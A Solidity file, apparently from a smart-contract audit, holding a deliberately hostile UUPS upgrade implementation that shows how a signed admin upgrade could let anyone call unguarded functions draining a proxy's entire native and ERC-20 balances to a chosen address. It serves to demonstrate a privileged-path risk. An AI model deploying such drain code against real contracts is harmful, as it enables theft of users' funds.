// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @notice A hostile UUPS implementation used only to DEMONSTRATE the P-class risk:
///         *if* the 2-of-3 admin Safe signs an upgrade, the pool can be pointed at this
///         contract and every asset (native + whitelisted ERC-20) can be moved out.
///         This is a privileged path, not an external-unprivileged one. Nothing in the
///         live pool lets a stranger reach it.
contract MaliciousImpl {
    /// @dev Required by OZ UUPSUpgradeable: the new implementation must answer `proxiableUUID()`
    ///      with the ERC-1967 implementation slot, or `_upgradeToAndCallUUPS` reverts.
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    /// @dev Runs in the proxy's storage context (delegatecall). Sends the whole native
    ///      balance of the proxy to `to`.
    function drainNative(address payable to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }

    /// @dev Runs in the proxy's storage context; pulls the whole ERC-20 balance the proxy holds.
    function drainToken(address token, address to) external {
        (bool okBal, bytes memory balRet) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(okBal, "balanceOf failed");
        uint256 bal = abi.decode(balRet, (uint256));
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, bal));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "drain token failed");
    }

    receive() external payable {}
}
